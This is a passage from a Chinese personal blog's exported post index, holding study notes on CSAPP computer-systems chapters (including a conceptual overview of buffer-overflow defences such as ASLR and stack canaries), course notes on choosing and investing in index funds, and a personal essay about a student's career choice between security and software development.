为该数组的数据类型的大小； 指针运算：同一个数据结构中的两个指针之差等于两个地址之差除以该数据类型的大小； 嵌套的数组：当我们创建数组的数组时，数组分配和引用的一般原则也是成立的； 定长数组：当程序要用一个常数作为数组的维度或者缓冲区的大小时，最好通过 # define 声明将这个常数与一个名字联系起来，然后在后面一直使用这个名字代替常数的数值； 变长数组：引用变长数组只需要对定长数组做点概括。动态的版本必须用乘法指令对i伸缩n倍，而不能使用一系列的移位和加法。在一些处理器中，乘法会招致严重的性能处罚，但在这种情况中无可避免； 3.9 异质的数据结构 结构（strcut）将多个对象集合到一个单位中；联合（union）允许用几种不同的类型来引用一个对象； 结构：结构的所有组成部分都存放在内存中一段连续的区域内，而指向结构的指针就是结构第一个字节的地址； 将指向结构的指针从一个地方传递到另一个地方，而不是复制它们，这是很常见的； 结构的各个字段的选取完全是在编译时处理的。机器代码不包含关于字段声明或字段名字的信息； 联合：联合提供了一种方式，能够规避C语言的类型系统，允许以多种类型来引用一个对象； 一个联合的总的大小等于它最大字段的大小； 它能引起一些讨厌的错误，因为它们绕过了C语言类型系统提供的安全措施； 一种应用情况是如果我们事先知道对一个数据结构中的两种不同字段的使用是互斥的，那么将这两个字段声明为联合的一部分，而不是结构的一部分，会减小分配空间的总量。对于有较多字段的数据结构，这样的节省会更吸引人； 联合还可以用来访问不同数据类型的位模式； 数据对齐：许多计算机系统对基本数据类型的合法地址做出了一些限制，要求某种类型对象的地址必须是某个值K的倍数。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计； 例如一个处理器总是能从内存中取 8 个字节，则地址必须为 8 的倍数；如果我们能保证所有的 double 类型数据的地址对齐成 8 的倍数，那么就可以用一个内存操作来读或者写值了。否则我们可能需要执行两次内存访问，因为对象可能被存放在两个 8 字节内存块中； 无论数据是否对齐，x86-64 硬件都能正确工作。不过，Intel 还是建议要对齐数据以提高内存系统的性能； 对齐原则是任何K字节的基本对象的地址必须是K的倍数： 对于包含结构的代码，编译器可能需要在字段的分配中插入间隙，以保证每个结构元素都满足它的对齐要求；而且结构本身对它的起始地址也有一些对齐要求； 3.10 在机器级程序中将控制与数据结合起来 缓冲区溢出，这是现实世界中许多系统中的一种很重要的安全漏洞； 理解指针：每个指针都对应一个类型。特殊的 void * 表示通用指针，可以被显式或者隐式的转换成有类型的指针；每个指针都有一个值。特殊的 NULL(0) 值表示该指针没有指向任何地方； 将指针从一种类型强制转换成另一种类型，只改变它的类型，而不改变它的值； 指针也可以指向函数，函数指针的值是该函数机器代码表示中第一条指令的地址； 应用-使用 GDB 调试器：GNU 的调试器 GDB 提供了许多有用的特性，支持机器级程序的运行时评估和分析； 内存越界引用和缓冲区溢出：我们已经看到，C语言对于数组引用不进行任何边界检查，而且局部变量和状态信息都存放在栈中。这两种结合到一起就能导致严重的程序错误； 缓冲区溢出的一个更加致命的使用就是让程序执行它本来不愿意执行的函数。这是一种最常见的通过计算机网络攻击系统安全的方法； 对抗缓冲区溢出的攻击： 栈随机化：栈随机化的思想使得栈的位置在程序每次运行时都有变化。在 Linux 系统中，栈随机化已经变成了标准行为。它是更大的一类技术中的一种，这类技术被称为地址空间布局随机化（ASLR=Address-Space Layout Randomization），ASLR 技术能够增加成功攻击一个系统的难度； 栈破坏检测：破坏通常发生在当超越局部缓冲区的边界时。最近的 GCC 版本在产生的代码中加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值（canary，这里是引申金丝雀能够当作哨兵提前察觉到危险存在），栈保护很好的防止了缓冲区溢出攻击破坏存储在程序栈上的状态； 限制可执行代码区域：一种方法是限制哪些内存区域能够存放可执行的代码； 支持变长的帧：为了管理变长的帧，x86-64 代码使用寄存器 %rbp 作为帧指针，有时也被称为基指针（base point）；","categories":[],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://leo.dropsec.xyz/tags/计算机系统/"}]},{"title":"CSAPP-第二章：信息的表示和处理","slug":"CSAPP-第二章：信息的表示和处理","date":"2018-10-20T02:20:45.000Z","updated":"2019-02-10T13:46:18.411Z","comments":true,"path":"2018/10/20/CSAPP-第二章：信息的表示和处理/","link":"","permalink":"http://leo.dropsec.xyz/2018/10/20/CSAPP-第二章：信息的表示和处理/","excerpt":"这一章读起来让人多少有点崩溃，然后想到了作者在开篇所说：如果你全力投身学习书本中的概念，完全理解底层计算机系统以及它对应用程序的影响，那么你会步上成为为数不多的“大牛”的道路。","text":"这一章读起来让人多少有点崩溃，然后想到了作者在开篇所说：如果你全力投身学习书本中的概念，完全理解底层计算机系统以及它对应用程序的影响，那么你会步上成为为数不多的“大牛”的道路。 2.1 信息存储 大多数计算机使用8位的块，或者字节（byte），作为最小的可寻址的内存单位，而不是访问内存中单独的位。机器级程序将内存视为一个非常大的字节数组，称为虚拟内存（virtual memory)。内存的每个字节都由一个唯一的数字来标识，称为它的地址，所有可能地址的集合称为虚拟地址空间（virtual address space）。 一个字节由8位组成，在二进制表示法中，值域位：00000000 ~ 11111111。在十进制表示法中值域为：0 ~ 255。在十六进制表示法中值域为00 ~ FF。 每台计算机都有一个字长（word size），虚拟地址是以这样一个字来编码的，所以字长决定的最重要的系统参数就是虚拟地址空间的最大大小。对于一个字长为w位的机器而言，虚拟地址的范围为$ 0 $ ~ $ 2^w-1 $,程序最多访问$ 2^w $个字节。 大多数64位机器也可以运行32位机器编译的程序，这是一种向后兼容。我们将程序称为“32位程序”或“64位程序”时，区别在于该程序是如何编译的，而不是其运行的机器类型。 程序员应该力图使他们的程序在不同的机器和编译器上可移植。可移植的一个方面就是使程序对不同数据类型的确切大小不敏感。 排列表示一个对象的字节有两个通用的规则。 小端法：按照从最低有效字节到最高有效字节的顺序在内存里存储对象。 大端法：按照从最高有效字节到最低有效字节的顺序在内存里存储对象。 大多数Intel兼容机都只用小端模式；IBM和Oracle的大多数机器则按大端模式操作。许多比较新的微处理器是双端法，但是一旦选择了特定操作系统，那么字节顺序也就固定下来了。比如用于移动电话的ARM微处理器，硬件支持双端操作，但是这些芯片上最常见的两种操作系统Android和IOS却只能运行小端模式。 不同的机器类型使用不同的且不兼容的指令和编码方式。即使是一样的进程，运行在不同的操作系统上也会有不同的编码规则，因此二进制代码是不兼容的。二进制代码很少能在不同的机器和操作系统组合之间移植。 布尔运算符 ~、&amp;、|、^ 分别对应逻辑运算符 NOT、AND、OR、EXCLUSIVE-OR。 C语言支持按位布尔运算，所使用的符号就是布尔运算符；C语言还提供了一组逻辑运算符||、&amp;&amp;、和！，分别对应于命题逻辑里的OR、AND、和NOT运算。 逻辑运算很容易和位级运算相混淆，但是其功能是完全不同的： 逻辑运算认为所有非零的参数都表示TRUE，而参数0表示FALSE。 如果对第一个参数求值就能确定表达式的结果，那么逻辑运算符就不会对第二个参数求值。 C语言中的移位： 左移：x&lt;&lt;k，x向左移动k位，丢弃最高k位，并在右端补k个0。 右移：x&gt;&gt;k，逻辑右移，在左端补k个0；算术右移，在左端补k个最高有效位的值。（填上符号位） 事实上，几乎所有的编译器/机器组合都对有符号数使用右移；对无符号数，右移必须是逻辑的。 2.2 整数表示 无符号数的编码： 在这个等式中，函数$B2U_w$将一个长度为w的0、1串映射到非负整数。 补码（Two’s complement）编码： 最高有效位$x_{w-1}$也称为符号位，它的权重为$-2^{w-1}$，是无符号表示中权重的负数。符号位被设置为1时，表示值为负；为0时，值为非负。 反码（Ones’complement）：除了最高有效位的权是$-(2^{w-1}-1)$，而不是$-2^{w-1}$,它和补码是一样的： 原码：最高有效位是符号位，用来确定剩下的位应该取正权还是负权： 原码和反码都有一个奇怪的属性，对数字0有两种不同的编码方式。正0都表示为[00…0]，负0在原码中表示为[10…0]，在反码中表示为[11…1]。 2.3 整数运算 无符号数加法： 补码加法： 无符号乘法： 补码乘法： 2.4 浮点数 定点数： 用23位表示整数，这范围比8位大多了， 但是精度又会受到损失了，可见用这种定点数的表示法，范围和精度是一对儿矛盾。如果再定义fixed number C, fixed number D， 程序员简直就不知道用哪个了，并且实现他们之间的计算也很麻烦。所以定点数并不是完美的解决方案。 浮点数：浮点数就是利用指数达到了小数点“浮动”的效果。从而可以灵活地表达更大范围内的 关于浮点数详细参考","categories":[],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://leo.dropsec.xyz/tags/计算机系统/"}]},{"title":"基金训练营笔记","slug":"基金训练营笔记","date":"2018-10-07T11:19:15.000Z","updated":"2019-02-10T14:17:55.545Z","comments":true,"path":"2018/10/07/基金训练营笔记/","link":"","permalink":"http://leo.dropsec.xyz/2018/10/07/基金训练营笔记/","excerpt":"无念说「我们现在意识跟得上，但是能力跟不上」，我想那就让思维先行吧。","text":"无念说「我们现在意识跟得上，但是能力跟不上」，我想那就让思维先行吧。 一、基金是什么 证券市场上的基金，是基金公司收集投资者的钱，按照证监会规定的规则，进行各种各样的投资的一种投资品。 基金独有的三大优势 起手金额少，投资门槛低； 可以有效地分散风险； 有专业的基金经理打理，省心省时省力。 不同基金的风险不同 最主要的影响因素是基金投资产品的种类，其中股票的占比越高的基金风险越高； 基金的资金量大小，基金经理的能力，都会影响基金的风险程度。 适合自己的基金才是好基金 每个人的投资目的，持续时间，风险承受能力都不同，所以选择的基金类型也因人而异。 选择基金一定要匹配自身情况，靠自己的知识去判断，不要指望着别人的推荐。 二、基金的分类 按投资品种不同分类 货币基金、债券基金：两者的篮子里都会装国债、地方政府债、公司债等等。不同之处在于债券基金除了投资债券还可以投资股票，当然债券占比不能低于80%；货币基金投资的一般都是1年内的短期债券，而债券基金则时间较长，一般是1年以上的债券。 混合基金：混合基金稳中求进，同时投资股票和债券，通过调整股票和债券的投资比例，实现收益和风险之间的平衡。按照偏重股票换是债券，混合基金还细分为偏股型基金、偏债型基金和平衡型基金。 股票基金：股票基金里大部分是股票，占比80%以上，另外会投资债券等其他投资品。 按投资渠道不同分类 场内基金：在证券交易所里买卖的基金，和你交易的是其他买家卖家； 场外基金：在证券交易所之外买卖基金，交易的对象是基金公司。 区别： 按运作方式不同分类 开方式基金：基金份额不固定，投资者可以随时买入或卖出，基金份额可增可减； 封闭式基金：基金在成立后的一段时间内基金份额是不变的，投资者只能在场内进行买卖。 扪心三问法读懂基金招募书 我买的是什么？ 读基金的募集安排，明确基金类型及风险程度。 我的钱交给谁？ 读基金公司（公司规模越大越好）与基金经理（从业时间越长越好），看是否有负面信息。 我的钱用在哪？ 读投资范围，明确投资基金的品种，进一步评估风险。 三、低风险基金的筛选方法（货基&amp;债基） 主要指标：每只基金的收益率、流动性、成立时间、基金规模、费率等指标。 收益率：选择收益率高的。万分收益，指上一个交易日一万元能够赚多少钱；7日年化收益，指根据过去7天的收益总和，计算出的年化收益率。 流动性：就是卖出这支基金后，资金多久能到账； 成立时间：一般3-5年以上较好，这样好拿之前情况做参考。 基金规模：越大越好。意味着基金公司在投资谈判时更有优势，同时也是分散投资，降低风险。 费率：越低越好。分认购（发行时）/申购费率、运作费率、赎回费率。 （基金经理是否频繁更换：换的越少越好） 补充：货币基金用来放一些随时会用到的钱，不要过分比较货币基金的收益。 货币基金特点：流动性高、风险低、收益稳定。债券基金风险、收益均高于货币基金，也比较稳定，流动性没货币基金那么强，适合投资半年甚至一年内用不到的钱。 四、高风险基金的筛选方法（混基&amp;股基） 混合型基金和股票型基金筛选方法 基金的业绩越强越好； 基金规模2亿-100亿比较好； 基金的成立时间3年以上； 基金公司盈利能力越强越好； 基金经理更换频率越小越好，基金经理选股择时能力仅作为排除参考； 手续费率越低越好； 资产配置比例是混合基金筛选的核心，股票型基金不需要考察这一点； 筛选小锦囊：在熊市里表现很烂但牛市里表现强于大盘的基金要慎重。 主动型基金和被动型基金 主动型基金：基金经理拿了户主的钱替户主投资，投资哪家的股票、哪家的债券，都是由基金经理说了算，主动出击，寻求超越平均水准的超值回报。 被动型基金：基金经理不主动寻求超越市场的表现，一般选取特定的指数成份股作为投资的对象，试图复制指数的表现，又叫指数基金。 主动型基金的缺点：主动型基金的关键因素在人，想要选择准，要看你眼光狠不狠主动型基金需要根据市场做出调整，操作6不6决定收益6不6。 被动型基金的优点：风险比主动型基金低、傻瓜式投资。 五、指数基金 指数是什么? 指数其实就是一个选股规则，它是按照某个规则挑选出一篮子股票，并由专业机构通过复杂的计算后算出这一篮子股票的平均价格，然后用来反映市场上这一类股票的价格水平。我们把这个平均价格称为指数点位，放在这个篮子里的这些股票，我们称它们是这只指数的成份股。 指数基金 指的是跟踪特定的指数，并按照这个指数成分股的比例，买入同样的股票组合的基金。 A股 所谓A股就是人民币普通股，是由中国境内公司发行、供境内机构、组织或个人以人民币认购和交易的普通股股票。简单地把它理解为国内股票市场。国内公司在.上市的时候，除了可以选择在A股,上市之外，也可以选择去美股或者港股市场上市，国内大部分的公司都是在A股上市的。 股票市场主要指数 什么是QDII? QDII又称为合格的境内投资者，简单地理解，就是我们可以用人民币投资海外股票市场。跟踪H股指数和恒生指数的基金就是H股指数基金和恒生指数基金，他们的特别之处在于，都属于QDII基金。 指数基金的分类—按是否通吃各行各业 宽基指数基金:在挑选股票的时候，不限制投资哪些行业，它覆盖了各行各业。沪深300、上证50、中证500、恒生指数、标准普尔500、纳斯达克100等就属于宽基指数。 行业指数基金:在挑选股票的时候，会要求只投资哪些行业的股票。行业指数，有代表消费行业的上证消费80、中证消费指数; 代表医疗行业的中证医疗指数和代表白酒行业的中证白酒指数等等。 区别：宽基指数基金，覆盖的行业更多更广，分配更均匀，受某个行业的影响小，盈利更稳定；行业指数基金，投资特定的行业受行业影响大，投资风险高一些。 指数基金的分类—按复制方式 完全复制型指数基金：完全复制目标指数所包含的所有成分股，照葫芦画瓢，追求的是获得和跟踪指数持平的收益。 增强型指数基金：除了复制目标指数外，基金经理还加入自己的一些主观投资，追求超过跟踪的指数的收益。 指数基金的优点： 灭绝人性 永垂不朽 笑到最后 指数基金的风险 指数基金本质是股票型基金，它依然存在风险。 虽然指数基金是复制和跟踪指数，来调整篮子里面的股票组合。但是基金经理如果复制得有偏差，或者没有及时跟着指数调整，也会带来收益方面的误差风险。 选择的指数基金规模小或者运作历史不长的话，也会有风险。 六、指数基金的筛选方法 先确定指数：选择指数基金的本质就是选择指数。对于大部分投资者来说，选择一个代表性强、主流的指数即可。选择指数还可以根据自己的偏好或收益预期来决定。 选择大品牌的基金公司：基金公司的实力对指数基金的表现起着至关重要的作用。基金公司的资金规模是一个重要权衡，最好资金规模要超过1000亿。 根据以下指标选好的指数基金： 跟踪误差率：跟踪误差越小越好，指数基金的投资目标就是为了完全复制指数，获得一个和指数一样的投资收益，那么判断一个指数基金的好坏，关键并不是看它的收益率，而是跟踪误差率，误差率低说明基金运作水平高。 基金规模：基金规模越大，流动性越强越好。一个指数基金规模较小，清盘的概率就比较大。 成立年限：成立年限长越长越好，最好选择超过3年的，小于1年的不要考虑。 费用成本：费用成本越低越好，费用包括认购费/申购费、管理费、托管费、赎回费，虽然大部分的基金费用为2%-3%，看起来也不是很大，但是在长期复利的威力下，就会对投资收益产生很大的影响。 补充： 基金概况里，如果基金代码里有显示“前端”或“后端”字样，基金类型是“股票指数”的话，一般都是场外基金。 如果基金类型中显示的是“ETF-场内”的话，则是场内基金;还有一种ETF联接基金，是场外基金，它投资跟踪场内对应ETF基金。例如华夏_上证50ETF联接，投资的就是场内的华夏上证50ETF。 无论是跟踪误差率、规模还是费率的大小、多少，都必须是与同类基金相比较而得出的结果。 不靠谱的指数估值指标： 大盘点数：1、不准确，因为指数是长期向上的，以香港的恒生指数为例，1964年只有100点，而现在23000多点。2、不同的指数不好对比。有的指数几万点是低估，有些指数5000点就是高估。 市盈率PE：市盈率=市值/净利润。这个指标体现的是这笔投资到底要花多长时间才能拿回来，简单理解就是看一只股票的价格，相比它的盈利能力，是不是足够便宜。PE的一大优点是快速有效，但是也有明显的缺陷:1、不同的国家地区(如香港对中国)，不同的指数，估值的波动区间不一样。2、就算在同一国家或地区来看，不同的行业市盈率各有不同，也没有可比性，而且就算有的市盈率低也并非就是好事。不能做唯一标准。 市净率PB：市净率=市值/净资产，市净率体现的是公司的净资产是否被低估。PB越低，公司越被低估，股票越值得投资。但这个重要数据，跟市盈率指标一样，不能做唯一标准。比如对于一些轻资产的公司，他不需要投入太多的资产就能获取更多的利润。 七、靠谱的指数估值指标—长投温度长投温度=(PE温度+PB温度)/2 原理：长投温度的高低与价格高低没有必然的联系哦，长投温度的高低反映的是在历史中低于指数当前估值出现的概率。例子:当长投温度是20度时，说明历史中，估值低于当前估值的概率只有20%，现在的指数比较低估，适合买入，而当长投温度是80度时，说明在历史中，估值低于当前估值的概率高达80%，现在的指数就高估了，应该卖出。 长投温度的计算： 详图 八、投资的几种方式 投资的四种方式： 一次性投资 不定期投资 定期定额投资 定期不定额投资定期不定额是基金投资最佳姿势，能让我们在低估值的时候买入更多份额，从而获得更多收益。基金定投首选便捷、费率低的场内渠道。 定投小tips： 定投日提醒 不加入主观臆断 收益投入再利用 九、简投法 简投法四步走 第一步:计算有目标时或者没有目标时每月的投资基数; 第二步:根据长投温度确定我们要投资的指数基金; 第三步:根据长投温度进行定投，确定买入卖出策略; 第四步:指数切换。当出现另一只指数的长投温度低于当前指数2度以上时，从温度高的指数切换到温度低的指数，待所有指数的长投温度都高时再分批卖出。卖出后得到的钱，作为存量资金，待市场降温出现投资机会后，继续按照以上四步开启下一轮投资。 有目标时的投资金额计算公式： 每月应投资金=PMT(r/12,n*12,,FV,1) r:预期年化收益率 n:投资年限 FV:预期收益+本金 没有目标时的投资金额计算(让资金保值增值)： 首先确定存量资金： 总存量资金=所有存款-应基金（3-6月基本日常支出） 确定每月增量资金： 每月增量资金=每月工资-日常基本开支-商业保险（当年保费/12） 确定自己的风险系数： 风险系数=(100-年龄)% 即可以投资高风险资产的比列 确定每月投资金额：每月投资金额=(总存量资金/20 + 每月增量资金)X风险系数 为了平坦成本，总存量分摊到20个月 如何根据长投温度进行定期不定额投资？ 十、买卖基金步骤 场内买基金步骤 开户; 找到要买的基金(如果账户里没有钱，需要通过银证转账进行转款); 买入时设定好价格和要买入的数量，确认委托; 查看委托有没有成功。(成功买入的第二天可以查看这笔交易的手续费等情况)。 场内卖基金步骤 在持仓中找到基金，选择卖出; 填写好卖出的价格和要卖的数量，确认卖出; 在委托中可以看到委托有没有成功。 场外买基金步骤（以支付宝为例） 打开支付宝，进入财富界面，进入基金，用代码找到你要买的那只基金。 点击买入，填写买入金额。 操作完成后第二天，在基金界面右下角的持有里，可以看到买入成功的基金。 场外卖基金步骤 从基金持有界面进入，看到目前持有的基金; 点击进去，在最下面一行点卖出，填写要卖出的份额。 对比 十一、投资心理建设 基金投资的两个重要原则： 闲钱 长期 典型的心理误区 不自信心理，我钱太少，不适合投资； 赌博心理，我想把所有的钱全部用来投资，以赚取更多的钱； 投机心理，短期的波段操作、赚把钱就跑； 喜涨厌跌心理，希望股价一直上涨不要跌； 不知足心理，止盈早了，感觉赚少了； 盲目从众心理，我的基金盈利不如别人的股票，要不换成股票？ 最佳基金投资心理 高筑墙：寻找低温度指数基金； 广积粮：开源节流，养大下蛋的鹅； 缓称王：不急不躁，坐等财富增值，享受复利威力； 做一名佛系投资者 指数基金长期内一定是向好的，但它什么时候跌什么时候涨都不受我们的控制，我们着急也没用，我们唯一能做的就是努力工作赚钱，然后把更多的钱投到低温度的指数基金里，静静等待它上涨的时候带着我们更多的惊喜。 十二、资产配置 资产配置的特点 少亏 少赚 如何制定和实施资产配置 第一步:根据自己的风险承受能力和偏好确定资产配置的策略和规则。（刚开始的时候可以采用最简单的50:50股债策略，规则是将股权类资产和债权类资产严格控制在50:50的比例上。） 第二步:每年做一次动态再平衡，根据帐户资金的变化按制定的策略重新调整一次仓位。 升级版资产配置收益小技巧 股权类资产可以再细分成几个不同的指数类型 灵活调整股权类资产和债权类资产的配置比例。（当长投温度低时多配指数基金，而长投温度高时则多配债券，这个投资比例可以在70:30到30:70之间来回变化。）","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://leo.dropsec.xyz/tags/读书笔记/"}]},{"title":"CSAPP-第一章：计算机系统漫游","slug":"CSAPP-第一章：计算机系统漫游","date":"2018-10-06T11:54:07.000Z","updated":"2019-02-10T13:45:44.252Z","comments":true,"path":"2018/10/06/CSAPP-第一章：计算机系统漫游/","link":"","permalink":"http://leo.dropsec.xyz/2018/10/06/CSAPP-第一章：计算机系统漫游/","excerpt":"Leooel和CSAPP(即Computer Systems: A Programmer’s Perspective)的计算机系统漫游。","text":"Leooel和CSAPP(即Computer Systems: A Programmer’s Perspective)的计算机系统漫游。 1.1 信息就是「位 + 上下文」 源程序实际上就是一个由值０和１组成的位（比特）序列，８个位被组织成一组，称为字节。每个字节表示程序中的某些文本字符。 系统中所有的信息——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示的。区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文。比如，在不同的上下文中，一个同样的字节序列可能表示一个整数、浮点数、字符串或者机器指令。 1.2 程序被其他程序翻译成不同的格式 在Unix系统上，从源文件到目标文件的转化是由编译器驱动程序完成的。这个转化过程可分为四个阶段完成，如下图所示。执行这四个阶段的程序（预处理器、编译器、汇编器和链接器）一起构成了编译系统。 预处理阶段：预处理器（cpp）根据以字符#开头的命令，修改原始的C程序，比如读取系统头文件的内容，并把它直接插入程序文本中，得到另一个C程序，通常以.i作为文件扩展名。 编译阶段：编译器（ccl）将文本文件hello.i翻译成hello.s，变成一个汇编语言程序。 汇编阶段：接下来，汇编器（as）将hello.s翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序的格式，并把结果保存在目标文件hello.o中。hello.o文件是一个二进制文件。 链接阶段：链接器（ld）负责链接程序中调用的事先库里提供的函数(如printf)到hello.o程序中，这样就得到了一个可执行目标文件。 1.3 了解编译系统如何工作是大有裨益的 从程序员的视角优化程序性能，比如做出好的编码选择。 理解链接时出现的错误。根据经验，一些最令人困扰的出现错误往往都与链接器操作有关，尤其是试图构建大型的软件系统时。 避免安全漏洞。 1.4 处理器读并解释存储在内存中的指令 系统的硬件组成 总线：贯穿整个系统的一组电子管。它携带信息字节并负责在各个部件间传递。通常总线被设计成传送定常的字节块，也就是字。字中的字节数（字长）是一个基本的系统参数，现在大多数机器字长要么是4个字节（32位）要么是8个字节（64位）。 I/O设备：I/O设备是系统与外部世界的联系通道。包含键盘、鼠标、显示器、磁盘、（网络）。每个I/O设备都通过一个控制器或适配器与I/O总线相连。 主存：主存是一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。从物理上来说，主存是由一组动态随机存取存储器（DRAM）芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。 处理器：中央处理单元（CPU），简称处理器，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或寄存器）称为程序计数器（PC）。在任何时刻，PC都指向主存中的某条机器语言指令。 运行hello程序 1.5 高速缓存至关重要 高速缓存存储器（cache)，作为暂时的集结区域，存放处理器近期可能会需要的信息。高速缓存用的是静态随机访问存储器（SRAM）。 高速缓存的局部性原理：即程序具有访问局部区域里的数据和代码的趋势。通过让高速缓存里存放可能经常访问的数据，大部分的内存操作都能在快速的高速缓存中完成。 1.6 存储设备形成层次结构 正如可以运用不同的高速缓存的知识来提高程序性能一样，程序员同样可以利用对整个存储器层次结构的理解来提高程序性能。 1.7 操作系统管理硬件 可以把操作系统看成是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。如图1-10。 操作系统有两个基本功能：（1）防止硬件被失控的应用程序滥用 （2）向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。 操作系统通过几个基本的抽象概念（进程、虚拟内存和文件）来实现这两个功能。如图1-11所示，文件是对I/O设备的抽象，虚拟内存是对主存和磁盘I/O设备的抽象，进程是对处理器、主存和I/O设备的抽象。 进程：进程是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。这个假象是通过进程的概念来实现的。并发运行 是说一个进程的指令和另一个进程的指令是交错执行的。 上下文切换是说无论在单核还是多核系统中，一个CPU看上去都像是在并发地执行多个进程，这是通过处理器在进程间切换来实现的。从一个进程切换到另一个进程是由操作系统内核（kernel）管理的，内核是操作系统代码常驻主存的部分。 线程：一个进程可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。 多线程之间比多进程之间更容易共享数据，线程一般也比进程更高效。 虚拟内存：虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一样的，称为虚拟地址空间。 文件：文件就是文字序列。每个I/O设备，都可以看成是文件。 1.8 系统之间利用网络通信网络提供了计算机系统之间通信的手段。从特殊系统的角度来看，网络就是一种I/O设备。 1.9 重要主题 Amdahl定律：主要思想是当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。 并行和并发：想要计算机做的更多、想要计算机做的更快是计算机整个发展历史中的两个持续动力。并发指一个同时具有多个活动的系统；并行指的是用并发来使一个系统运行的更快。 抽象在计算机系统中有很大的重要性。 小结 计算机系统是由硬件和系统软件组成的，它们共同协作以运行应用程序。计算机内部的信息被表示为一组组的位，它们依据上下文有不同的解释方式。程序被其他程序翻译成不同的形式，开始时是ASCII文本，然后被编译器和链接器翻译成二进制可执行文件。 处理器读取并解释存放在主存里的二进制指令。因为计算机花费了大量的时间在内存、I/O设备和CPU寄存器之间复制数据，所以将系统中的存储设备划分成层次结构——CPU 寄存器在顶部，接着是多层的硬件高速缓存存储器、DRAM主存和磁盘存储器。在层次模型中，位于更高层的存储设备比低层的存储设备要更快，单位比特造价也更高。层次结构中较高层次的存储设备可以作为较低层次设备的高速缓存。通过理解和运用这种存储层次结构的知识，程序员可以优化C程序的性能。 操作系统内核是应用程序和硬件之间的媒介。它提供三个基本的抽象: 1)文件是对I/O设备的抽象:2)虚拟内存是对主存和磁盘的抽象; 3)进程是处理器、主存和I/O设备的抽象。 最后，网络提供了计算机系统之间通信的手段。从特殊系统的角度来看，网络就是一种I/O设备。","categories":[],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://leo.dropsec.xyz/tags/计算机系统/"}]},{"title":"Life is binary,zeros and ones.","slug":"Life-is-binary-zeros-and-ones","date":"2018-09-08T03:00:22.000Z","updated":"2018-12-14T06:58:40.690Z","comments":true,"path":"2018/09/08/Life-is-binary-zeros-and-ones/","link":"","permalink":"http://leo.dropsec.xyz/2018/09/08/Life-is-binary-zeros-and-ones/","excerpt":"01010111 01011000 01001010 01101001 01011001 01101110 01001010 00110101 01001100 01000111 01011010 01101110 01011010 01010111 01101000 00110000 01100100 01001000 01101100 01111001 01001001 01010001 00111101 00111101","text":"01010111 01011000 01001010 01101001 01011001 01101110 01001010 00110101 01001100 01000111 01011010 01101110 01011010 01010111 01101000 00110000 01100100 01001000 01101100 01111001 01001001 01010001 00111101 00111101 总有种感觉抑或错觉。做了一个选择，事后回过头来看当时的选择还是蛮正确的。我以为这种感觉会有利于我更自信的去做下一个选择，事实证明它更可能是一种错觉。 简单记录一下我的大二，不至于日后很快遗忘，也好给自己一个交代。 大一下学期包括寒假当时是想着学习算法，然后跟着ACM队学习。由于某种原因后来没有正式进入ACM。后来有意还是无意的进入了超星，学习Java、爬虫，但是由于当时认知和能力的原因，大一下的我对超星所学东西没有系统的认识，导致学习动力不足。17年5月份在安恒杯中接触并了解了Drops，然后就开始了为期一年的二进制安全学习，直到现在。然而现在我又面临了一个选择。 在Drops学习的这一年多里，学到了很多技术本领，视野也扩大了好多。我也一直在问自己喜欢二进制吗？要把二进制当作自己的饭碗吗？好像每次都未能回答自己。在安全、安全+考研、开发、开发+考研这几个选项中，结合自己的性格，我一直在寻找最适合自己的路，但也一直在两者中间徘徊，好像是在逃避。现在冷静分析一下。 安全 优：(信息安全)前景较广阔、工作环境相对较好、薪资待遇较高、知识变更速度较慢 劣：二进制安全对应工作相对较少、就业门槛相对较高，学不到比较好的程度不好就业，并且就业面相对较窄；偏向于研究，到后期二进制工作基本分为(恶意)代码分析、挖软件漏洞，要不牛逼，要不web；很多学习二进制的最后在工作中都是从事和web相关的(当然，也不是说web不好)。 安全 + 考研 心里完全没底，安全考研一般是偏向研究的，对研究型安全基本没概念。 软件开发 优：可选范围多、科技浪潮一波接一波、机遇较多、容易向科技热门转型 劣：竞争较激烈、知识更新较快、需要较广的知识宽度和相应的知识深度、可能会遭遇中年危机 软件开发 + 考研 给自己多一点的时间，提高自己的起点，增强自己的竞争力。 上面的分析只是出于自己目前的认知水平，或许不是很客观。结合自己的性格与上面的分析，现阶段感觉选项三、选项四更适合自己。所以我还是决定暂时把安全学习当作自己的业余爱好，大三这一年将重点放在动手做项目上，同时也要注意重要课程基础知识的学习来面对考研。 真的，这个选择自己纠结了好久，有时候也很无助。但是现在不纠结了，因为我决定了。当然自己也付出了相应的试错成本。 惟愿自己能安静的利用好大三这一年的时间。 Life is binary, it is a mash of zeros and ones and straightforward if you can master how to read it without translation. Life is also a game, there is an end goal and it looks simple and straightforward at the beginning, but as you get started you meet all the obstacles and have to fight and play through it to get to the end. Life is simple, you can see that if you just breathe and accept nothing is ever in your control. Life is hard, because as humans, we cannot give up our fetish for control and over thinking. Life is beautiful, filled with joys and love, great people and great things that bring us pleasure. Life is also ugly, filled with hate, pain and blood thirsty greed. Life is a lot of things, who you choose to have in yours determines which part of life you’ll live, some will make it great, some will make it hurt. Life is also full of chances, if you chose wrong, you can always start over. You can always let go of some people and keep some people. Life is Life like 